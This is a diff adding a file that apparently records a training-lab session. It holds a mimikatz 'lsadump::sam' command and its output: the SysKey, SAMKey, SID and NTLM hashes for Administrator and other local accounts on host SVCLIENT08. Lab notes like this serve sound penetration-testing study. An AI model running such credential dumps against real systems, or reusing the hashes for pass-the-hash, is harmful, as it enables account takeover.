@@ -1,0 +1,24 @@
+mimikatz # lsadump::sam
+Domain : SVCLIENT08
+SysKey : 4212bea7d4b31a34a8ce50e5c049c2ec
+Local SID : S-1-5-21-237104100-2676777109-815765336
+
+SAMKey : 64ae66296b01fd4970a65d896f50c3b0
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: ee0c207898a5bccc01f38115019ca2fb
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000003e8 (1000)
+User : defaultuser0
+  Hash NTLM: b5651cd15899057b71ad62075fc0cea6
+
+RID  : 000003e9 (1001)
+User : offsec
+  Hash NTLM: ee0c207898a5bccc01f38115019ca2fb
